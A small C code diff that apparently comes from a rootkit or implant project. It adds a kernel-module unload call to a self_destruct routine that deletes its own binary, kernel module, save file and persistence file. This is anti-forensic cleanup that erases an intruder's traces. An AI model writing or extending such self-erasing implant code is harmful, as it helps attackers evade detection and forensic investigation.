@@ -303,7 +303,12 @@ char *get_self(char *path) {
   return NULL;
 }
 
-// first it deletes itself, the kernel module, the save file and the persistence file
+/*
+
+ * first it deletes itself, the kernel module, the save file and the persistence file
+ * lastly unloads the kernel module
+
+*/
 void self_destruct() {
   char self[PATH_MAX + 1];
 
@@ -337,4 +342,6 @@ skip_self:
     debug_err("failed to unlink the persistence file");
     return;
   }
+
+  kernel_unload();
 }
